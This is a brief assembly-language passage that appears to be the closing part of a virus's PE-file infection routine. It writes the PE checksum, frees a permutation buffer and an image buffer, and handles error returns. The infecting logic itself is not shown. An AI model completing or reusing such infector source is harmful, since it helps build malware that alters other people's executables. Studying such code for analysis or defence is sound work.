                mov [ebx.pe_checksum],edx
		pop esi
		pop edx
no_checksum:

;≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤≤

		push __param.build_offset			;
		call free                                       ; permutation 
		add esp,4                                       ; bufer

infect_free:

		push edx 					;
                call free                                       ; image bufer
		add esp,4                                       ;

infect_exit:
                ntadd <60+SIZE ltmeparam>
                mov [esp._ecx],ecx                              ; ECX=size
                mov [esp._eax],esi                              ; EAX=bufer
                popa
                ret

;------------------------------------------------------------------------------
infect_error_exit:
                xor ecx,ecx					; 
		dec ecx                                         ; error  value
                jmp infect_exit                                 ; FFFFFFFF

infect_error_free:
                xor ecx,ecx
		dec ecx
                jmp infect_free



include ..\sort.inc
